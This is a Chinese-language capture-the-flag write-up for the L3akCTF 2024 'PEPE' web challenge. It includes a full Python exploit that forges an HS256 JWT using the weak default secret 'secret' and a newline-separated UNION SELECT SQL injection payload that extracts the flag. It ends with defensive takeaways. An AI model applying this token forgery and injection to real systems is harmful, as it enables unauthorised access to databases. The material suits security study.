# L3akCTF 2024 PEPE Writeup

## 题目简述

应用登录后把用户名、密码放入 HS256 JWT。Dashboard 从 JWT 读取用户名，经过黑名单后直接拼入 SQLite 查询：

```python
query = (
    "SELECT fortune FROM users "
    f"WHERE username='{username}';"
)
```

JWT 默认密钥只是 `secret`，而 Dashboard 不会再次确认 token 中的用户名是否真实存在。攻击链是先伪造任意用户名的合法 JWT，再用换行代替被过滤的空格完成 `UNION SELECT`。

## 解题过程

### 伪造 JWT

源码使用：

```python
secret = os.environ.get("SECRET", "secret")
```

题目容器没有设置 `SECRET`，所以实际密钥就是 `secret`。即使没有源码，拿到正常登录 token 后也能通过常见弱口令字典验证这一点。

Dashboard 只验证 HS256 签名与过期时间：

```python
decoded_token = jwt.decode(
    token,
    secret,
    algorithms=["HS256"],
)
username = decoded_token.get("username")
```

它不会查询数据库确认该用户名属于当前会话，因此可直接修改 `username` claim 并重新签名。

### 绕过 SQL 关键字过滤

黑名单拦截普通空格、`or`、`and`、`where`、`like` 等片段，但没有拦截 `union`、`select`、`from` 和换行。SQL 词法分析会把换行同样视为空白，所以用户名可设置为：

```text
'union
select
flag
from
flag--
```

代入后形成：

```sql
SELECT fortune
FROM users
WHERE username=''
UNION
SELECT flag
FROM flag
--';
```

前半部分不返回用户，后半部分把 `flag` 表的唯一列作为 `fortune` 返回。

完整利用脚本：

```python
from datetime import datetime, timedelta, timezone

import jwt
import requests

base_url = "http://target"
secret = "secret"

username = (
    "'union\n"
    "select\n"
    "flag\n"
    "from\n"
    "flag--"
)

token = jwt.encode(
    {
        "username": username,
        "password": "",
        "exp": datetime.now(timezone.utc)
        + timedelta(minutes=30),
    },
    secret,
    algorithm="HS256",
)

response = requests.get(
    f"{base_url}/dashboard",
    cookies={"token": token},
)
response.raise_for_status()
print(response.text)
```

Dashboard 把查询结果渲染到 `fortunes` 位置，得到：

```text
L3AK{5q1_1nj3ct10n_CLF}
```

## 方法总结

- JWT 签名通过只说明 token 未被未知密钥篡改；若密钥是弱口令，攻击者可以生成任意合法 claim。
- 应用不能把签名 token 中的用户名直接当成数据库查询语句的一部分，参数化查询仍是必要边界。
- 黑名单中的普通空格并不能阻止 SQLi，换行、制表符和注释都可能承担词法分隔作用。
- 附件中的三张 Dashboard 配图只是页面装饰，不承载漏洞或 flag 证据，因此没有复制进 WP。
